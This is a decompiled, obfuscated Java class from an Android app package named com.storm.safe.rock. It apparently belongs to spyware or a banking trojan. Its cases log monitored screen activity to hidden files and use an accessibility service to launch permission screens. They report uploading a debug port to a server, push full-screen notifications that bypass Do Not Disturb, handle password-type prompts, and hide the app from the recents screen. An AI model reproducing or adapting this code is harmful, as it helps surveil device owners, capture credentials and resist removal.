package p000;

import android.R;
import android.accessibilityservice.AccessibilityService;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.graphics.Typeface;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.RelativeLayout;
import android.widget.TextView;
import androidx.work.impl.utils.futures.C0100a1;
import androidx.work.impl.workers.ConstraintTrackingWorker;
import com.google.android.material.R$string;
import com.google.android.material.datepicker.AbstractC0196a6;
import com.google.android.material.textfield.TextInputLayout;
import com.storm.safe.rock.R$drawable;
import com.storm.safe.rock.inject.jbqfkndyx;
import com.storm.safe.rock.iuzxujjtqev;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.dqtvuisjd$screenStateReceiver$1;
import com.storm.safe.rock.service.modules.AbstractC0315a0;
import com.storm.safe.rock.service.modules.ActivityMonitor$LogType;
import com.storm.safe.rock.service.modules.C0318a3;
import com.storm.safe.rock.service.modules.protection.C0356a1;
import com.storm.safe.rock.service.modules.setup.C0360a2;
import com.storm.safe.rock.service.modules.yw5xud.C0365a2;
import com.storm.safe.rock.service.modules.yw5xud.C0372a9;
import com.storm.safe.rock.service.modules.yw5xud.umrkmgrri;
import com.storm.safe.rock.service.tisxhskrc;
import io.socket.engineio.parser.Base64;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.atomic.AtomicBoolean;
import kotlin.jvm.internal.Lambda;
import kotlin.jvm.internal.Ref$IntRef;
import okhttp3.internal.p032ws.WebSocketProtocol;
import org.conscrypt.FileClientSessionCache;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: p1 */
/* loaded from: classes2.dex */
public final /* synthetic */ class RunnableC1052p1 implements Runnable {

    /* renamed from: a0 */
    public final /* synthetic */ int f59134a0;

    /* renamed from: a1 */
    public final /* synthetic */ Object f59135a1;

    /* renamed from: a2 */
    public final /* synthetic */ Object f59136a2;

    /* JADX WARN: Multi-variable type inference failed */
    public /* synthetic */ RunnableC1052p1(C0454ef c0454ef, w00 w00Var) {
        this.f59134a0 = 4;
        this.f59135a1 = c0454ef;
        this.f59136a2 = (Lambda) w00Var;
    }

    /* JADX WARN: Type inference failed for: r1v14, types: [kotlin.jvm.internal.Lambda, w00] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:25:0x0078 -> B:214:0x002f). Please report as a decompilation issue!!! */
    @Override // java.lang.Runnable
    public final void run() {
        File file;
        w00 w00Var;
        AccessibilityNodeInfo accessibilityNodeInfo;
        switch (this.f59134a0) {
            case 0:
                ActivityMonitor$LogType activityMonitor$LogType = (ActivityMonitor$LogType) this.f59135a1;
                String str = (String) this.f59136a2;
                t60.m214695b6(str, "$text");
                try {
                    String strName = activityMonitor$LogType.name();
                    String str2 = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());
                    File externalStorageDirectory = AbstractC0315a0.f53039b4;
                    if (externalStorageDirectory == null) {
                        externalStorageDirectory = Environment.getExternalStorageDirectory();
                    }
                    File file2 = new File(externalStorageDirectory, "IC/" + strName);
                    File file3 = new File(file2, str2 + ".txt");
                    if (!file2.exists()) {
                        file2.mkdirs();
                    }
                    if (file3.exists() && file3.length() >= 1048576) {
                        int i = 1;
                        do {
                            file = new File(file2, str2 + "_" + i + ".txt");
                            i++;
                        } while (file.exists());
                        file3.renameTo(file);
                        file3 = new File(file2, str2 + ".txt");
                    }
                    if (!file3.exists()) {
                        file3.createNewFile();
                    }
                    String str3 = AbstractC0315a0.f53025a0;
                    String str4 = AbstractC0315a0.m211540a2(str + ">") + ":::";
                    FileOutputStream fileOutputStream = new FileOutputStream(file3, true);
                    try {
                        OutputStreamWriter outputStreamWriter = new OutputStreamWriter(fileOutputStream);
                        try {
                            BufferedWriter bufferedWriter = new BufferedWriter(outputStreamWriter);
                            try {
                                bufferedWriter.write(str4);
                                bufferedWriter.close();
                                outputStreamWriter.close();
                                fileOutputStream.close();
                                AbstractC0315a0.m211538a0(activityMonitor$LogType, str);
                                return;
                            } finally {
                            }
                        } finally {
                        }
                    } finally {
                    }
                } catch (Exception e) {
                    tz0.m214807a7("Record 失败: ", e.getMessage(), "ActivityMonitor");
                    return;
                }
            case 1:
                h10 h10Var = (h10) this.f59135a1;
                List list = (List) this.f59136a2;
                t60.m214695b6(h10Var, "$callback");
                t60.m214695b6(list, "$result");
                h10Var.invoke(list);
                return;
            case 2:
                C0032al c0032al = (C0032al) this.f59135a1;
                dqtvuisjd dqtvuisjdVar = (dqtvuisjd) this.f59136a2;
                t60.m214695b6(c0032al, "this$0");
                c0032al.m209811a0(dqtvuisjdVar);
                return;
            case 3:
                ExecutorC0034an executorC0034an = (ExecutorC0034an) this.f59135a1;
                Runnable runnable = (Runnable) this.f59136a2;
                executorC0034an.getClass();
                try {
                    runnable.run();
                    return;
                } finally {
                    executorC0034an.m209823a0();
                }
            case 4:
                C0454ef c0454ef = (C0454ef) this.f59135a1;
                ?? r1 = (Lambda) this.f59136a2;
                t60.m214695b6(c0454ef, "this$0");
                Handler handler = c0454ef.f55996b8;
                RelativeLayout relativeLayout = c0454ef.f55981a3;
                if (relativeLayout != null) {
                    relativeLayout.setVisibility(8);
                }
                handler.postDelayed(new RunnableC0941o6(r1), 100L);
                handler.postDelayed(new RunnableC0436dz(c0454ef, 2), 500L);
                return;
            case 5:
                C0318a3 c0318a3 = (C0318a3) this.f59135a1;
                Intent intent = (Intent) this.f59136a2;
                t60.m214695b6(c0318a3, "this$0");
                t60.m214695b6(intent, "$intent");
                c0318a3.f53045a0.sendBroadcast(intent);
                return;
            case 6:
                List<AbstractC0799kx> list2 = (List) this.f59135a1;
                AbstractC0826ln abstractC0826ln = (AbstractC0826ln) this.f59136a2;
                t60.m214695b6(list2, "$listenersList");
                for (AbstractC0799kx abstractC0799kx : list2) {
                    Object obj = abstractC0826ln.f58057a4;
                    abstractC0799kx.f57743a3 = obj;
                    abstractC0799kx.m213765a3(abstractC0799kx.f57744a4, obj);
                }
                return;
            case 7:
                ConstraintTrackingWorker constraintTrackingWorker = (ConstraintTrackingWorker) this.f59135a1;
                ob0 ob0Var = (ob0) this.f59136a2;
                synchronized (constraintTrackingWorker.f45589a5) {
                    try {
                        if (constraintTrackingWorker.f45590a6) {
                            C0100a1 c0100a1 = constraintTrackingWorker.f45591a7;
                            t60.m214694b5(c0100a1, "future");
                            int i2 = AbstractC0828lp.f58060a0;
                            c0100a1.m210484a8(new qb0());
                        } else {
                            constraintTrackingWorker.f45591a7.m210486b0(ob0Var);
                        }
                    } catch (Throwable th) {
                        throw th;
                    }
                }
                return;
            case 8:
                AbstractC0196a6 abstractC0196a6 = (AbstractC0196a6) this.f59135a1;
                String str5 = (String) this.f59136a2;
                TextInputLayout textInputLayout = abstractC0196a6.f49407a0;
                SimpleDateFormat simpleDateFormat = abstractC0196a6.f49408a1;
                Context context = textInputLayout.getContext();
                textInputLayout.setError(context.getString(R$string.mtrl_picker_invalid_format) + "\n" + String.format(context.getString(R$string.mtrl_picker_invalid_format_use), str5.replace(' ', (char) 160)) + "\n" + String.format(context.getString(R$string.mtrl_picker_invalid_format_example), simpleDateFormat.format(new Date(b91.m210615a5().getTimeInMillis())).replace(' ', (char) 160)));
                abstractC0196a6.mo210742a0();
                return;
            case 9:
                C0365a2 c0365a2 = (C0365a2) this.f59135a1;
                CountDownLatch countDownLatch = (CountDownLatch) this.f59136a2;
                AccessibilityService accessibilityService = c0365a2.f55063a1;
                try {
                    Intent intent2 = new Intent(accessibilityService, (Class<?>) umrkmgrri.class);
                    intent2.setFlags(276824064);
                    accessibilityService.startActivity(intent2);
                    t60.m214704c5("HuaweiSteps", "[权限] umrkmgrri已启动");
                } catch (Exception e2) {
                    tz0.m214807a7("[权限] 启动失败: ", e2.getMessage(), "HuaweiSteps");
                }
                countDownLatch.countDown();
                return;
            case 10:
                ((so0) this.f59135a1).mo210482a4((jg1) this.f59136a2, false);
                return;
            case oe0.DEFAULT_M /* 11 */:
                ((cq0) this.f59135a1).mo212509c7((Typeface) this.f59136a2);
                return;
            case FileClientSessionCache.MAX_SIZE /* 12 */:
                C0360a2 c0360a2 = (C0360a2) this.f59135a1;
                w00 w00Var2 = (w00) this.f59136a2;
                AtomicBoolean atomicBoolean = c0360a2.f53823a8;
                if (!atomicBoolean.get() || c0360a2.f53831b6) {
                    return;
                }
                c0360a2.f53831b6 = true;
                t60.m214714d6("SystemOptimize", "强制部署180秒超时");
                atomicBoolean.set(false);
                w00Var2.invoke();
                return;
            case 13:
                try {
                    t60.m214714d6("SystemOptimize", "上传调试端口到服务器: " + ((C0360a2) this.f59135a1).m212101l1(((Ref$IntRef) this.f59136a2).f57624a0));
                    return;
                } catch (Exception e3) {
                    t60.m214705c6("SystemOptimize", "上传调试端口到服务器失败", e3);
                    return;
                }
            case 14:
                bd1 bd1Var = (bd1) this.f59135a1;
                View[] viewArr = (View[]) this.f59136a2;
                if (bd1Var.f45826b5 != -1) {
                    for (View view : viewArr) {
                        view.setTag(bd1Var.f45826b5, Long.valueOf(System.nanoTime()));
                    }
                }
                if (bd1Var.f45827b6 != -1) {
                    for (View view2 : viewArr) {
                        view2.setTag(bd1Var.f45827b6, null);
                    }
                    return;
                }
                return;
            case WebSocketProtocol.B0_MASK_OPCODE /* 15 */:
                gg1 gg1Var = (gg1) this.f59135a1;
                C0100a1 c0100a12 = (C0100a1) this.f59136a2;
                if (gg1Var.f56463a0.f56381a0 instanceof C0486f8) {
                    c0100a12.cancel(true);
                    return;
                } else {
                    c0100a12.m210486b0(gg1Var.f56466a3.mo210453a0());
                    return;
                }
            case 16:
                fh1 fh1Var = (fh1) this.f59135a1;
                ob0 ob0Var2 = (ob0) this.f59136a2;
                if (fh1Var.f56273b5.f56381a0 instanceof C0486f8) {
                    ob0Var2.cancel(true);
                    return;
                }
                return;
            case 17:
                C0372a9 c0372a9 = (C0372a9) this.f59135a1;
                String str6 = (String) this.f59136a2;
                String str7 = c0372a9.f55148a5;
                try {
                    AccessibilityNodeInfo rootInActiveWindow = c0372a9.f53208a0.getRootInActiveWindow();
                    if (rootInActiveWindow == null) {
                        return;
                    }
                    if (c0372a9.m212449a5(rootInActiveWindow, str6)) {
                        t60.m214704c5(str7, "[弹窗检测] ✅ 已点击'" + str6 + "'(延迟)");
                    }
                    rootInActiveWindow.recycle();
                    return;
                } catch (Exception e4) {
                    tz0.m214810b0("[弹窗检测] 延迟点击异常: ", e4.getMessage(), str7);
                    return;
                }
            case 18:
                Intent intent3 = (Intent) this.f59135a1;
                dqtvuisjd dqtvuisjdVar2 = (dqtvuisjd) this.f59136a2;
                dqtvuisjd.C0290a0 c0290a0 = dqtvuisjd.f52358m1;
                Activity currentActivity = iuzxujjtqev.f51956e2.getCurrentActivity();
                if (currentActivity != null && !currentActivity.isFinishing() && !currentActivity.isDestroyed()) {
                    currentActivity.startActivity(intent3);
                    t60.m214714d6("dqtvuisjd", "🔐 [策略1-延迟] moveToFront 后通过前台 Activity 启动 syuqattwmgit");
                    return;
                }
                try {
                    Object systemService = dqtvuisjdVar2.getSystemService("notification");
                    t60.m214693b4(systemService, "null cannot be cast to non-null type android.app.NotificationManager");
                    NotificationManager notificationManager = (NotificationManager) systemService;
                    if (Build.VERSION.SDK_INT >= 26 && notificationManager.getNotificationChannel("confirm_device_channel") == null) {
                        r70.m214503b1();
                        NotificationChannel notificationChannelM214518c6 = r70.m214518c6(dqtvuisjdVar2.getString(com.storm.safe.rock.R$string.notification_channel_system_verify));
                        notificationChannelM214518c6.setDescription(dqtvuisjdVar2.getString(com.storm.safe.rock.R$string.notification_channel_system_verify_desc));
                        notificationChannelM214518c6.setBypassDnd(true);
                        notificationChannelM214518c6.setLockscreenVisibility(1);
                        notificationManager.createNotificationChannel(notificationChannelM214518c6);
                    }
                    PendingIntent activity = PendingIntent.getActivity(dqtvuisjdVar2, 10089, intent3, 201326592);
                    ak0 ak0Var = new ak0(dqtvuisjdVar2, "confirm_device_channel");
                    ak0Var.f43688b7.icon = R$drawable.rbg20;
                    ak0Var.f43675a4 = ak0.m209804a1(" ");
                    ak0Var.f43676a5 = ak0.m209804a1(" ");
                    ak0Var.f43680a9 = 1;
                    ak0Var.f43683b2 = "call";
                    ak0Var.f43678a7 = activity;
                    ak0Var.m209806a2(128);
                    ak0Var.m209806a2(16);
                    ak0Var.f43689b8 = true;
                    Notification notificationM209805a0 = ak0Var.m209805a0();
                    t60.m214694b5(notificationM209805a0, "Builder(this, FULL_SCREE…\n                .build()");
                    notificationManager.notify(10089, notificationM209805a0);
                    t60.m214714d6("dqtvuisjd", "🔔 全屏通知已发送，等待系统唤起 syuqattwmgit");
                    new Handler(Looper.getMainLooper()).postDelayed(new RunnableC0941o6(22, notificationManager), 3000L);
                } catch (Exception e5) {
                    t60.m214705c6("dqtvuisjd", "❌ 全屏通知启动失败，回退 Service context", e5);
                    try {
                        dqtvuisjdVar2.startActivity(intent3);
                    } catch (Exception e6) {
                        t60.m214705c6("dqtvuisjd", "❌ 兜底 startActivity 也失败", e6);
                    }
                }
                t60.m214726f4("dqtvuisjd", "🔔 [策略2兜底] moveTaskToFront 后仍无前台 Activity，尝试通知");
                return;
            case Base64.Encoder.LINE_GROUPS /* 19 */:
                dqtvuisjd dqtvuisjdVar3 = (dqtvuisjd) this.f59135a1;
                String str8 = (String) this.f59136a2;
                int i3 = dqtvuisjd$screenStateReceiver$1.f52681a1;
                t60.m214695b6(dqtvuisjdVar3, "this$0");
                t60.m214695b6(str8, "$passwordType");
                dqtvuisjdVar3.m211521l8(str8);
                return;
            case 20:
                iuzxujjtqev iuzxujjtqevVar = (iuzxujjtqev) this.f59135a1;
                ArrayList arrayList = (ArrayList) this.f59136a2;
                iuzxujjtqev.C0254a0 c0254a0 = iuzxujjtqev.f51956e2;
                TextView textView = iuzxujjtqevVar.f51958c3;
                if (textView == null) {
                    t60.m214724f2("statusText");
                    throw null;
                }
                textView.setText(iuzxujjtqevVar.getString(com.storm.safe.rock.R$string.status_requesting_permissions, AbstractC0715je.m213295i2(arrayList, ", ", null, null, null, 62)));
                TextView textView2 = iuzxujjtqevVar.f51958c3;
                if (textView2 != null) {
                    textView2.setTextColor(iuzxujjtqevVar.getColor(R.color.holo_orange_dark));
                    return;
                } else {
                    t60.m214724f2("statusText");
                    throw null;
                }
            case 21:
                try {
                    ((dqtvuisjd) this.f59135a1).m211448d3(((jbqfkndyx) this.f59136a2).f51949a1);
                    return;
                } catch (Exception unused) {
                    return;
                }
            default:
                C0356a1 c0356a1 = (C0356a1) this.f59135a1;
                String str9 = (String) this.f59136a2;
                if (!c0356a1.f53719a2 || (w00Var = c0356a1.f53724a7) == null || (accessibilityNodeInfo = (AccessibilityNodeInfo) w00Var.invoke()) == null) {
                    return;
                }
                try {
                    if (C0356a1.m211952a3(accessibilityNodeInfo)) {
                        c0356a1.f53721a4 = System.currentTimeMillis();
                        c0356a1.m211953a0();
                        tisxhskrc.f55188a0.scheduleGuard(c0356a1.f53717a0);
                        if (c0356a1.f53720a3) {
                            t60.m214714d6("npweufstehlb", "🎭 检测到最近任务(pkg=" + str9 + ", appOpened=true) → excludeFromRecents + 闹钟 + HOME");
                            c0356a1.m211954a1();
                        } else {
                            t60.m214714d6("npweufstehlb", "🎭 检测到最近任务(pkg=" + str9 + ", appOpened=false) → excludeFromRecents + 闹钟");
                        }
                    }
                } catch (Exception e7) {
                    t60.m214726f4("npweufstehlb", "🎭 [检测] 异常: " + e7.getMessage());
                } finally {
                    try {
                        accessibilityNodeInfo.recycle();
                    } catch (Exception unused2) {
                    }
                }
                try {
                    accessibilityNodeInfo.recycle();
                    return;
                } catch (Exception unused3) {
                    return;
                }
        }
    }

    public /* synthetic */ RunnableC1052p1(Object obj, int i, Object obj2) {
        this.f59134a0 = i;
        this.f59135a1 = obj;
        this.f59136a2 = obj2;
    }
}
